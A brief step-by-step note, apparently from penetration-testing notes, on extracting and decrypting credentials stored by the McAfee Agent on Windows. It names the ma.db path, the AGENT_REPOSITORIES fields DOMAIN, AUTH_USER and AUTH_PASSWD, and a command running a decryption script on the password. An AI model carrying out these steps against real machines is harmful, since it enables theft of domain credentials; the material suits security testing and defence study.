
1. Find the ma.db file inside C:\ProgramData\McAfee\Agent\DB

2. Browse the datebase using 
```Script
sqlitebrowser ma.db
```

3. Browse the AGENT_REPOSITORIES table and look for the DOMAIN, AUTH_USER, and AUTH_PASSWD field entries.
4. Decrypt the password using mcafee_sitelist_pwd_decrypt.py using the following script
```Script
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```
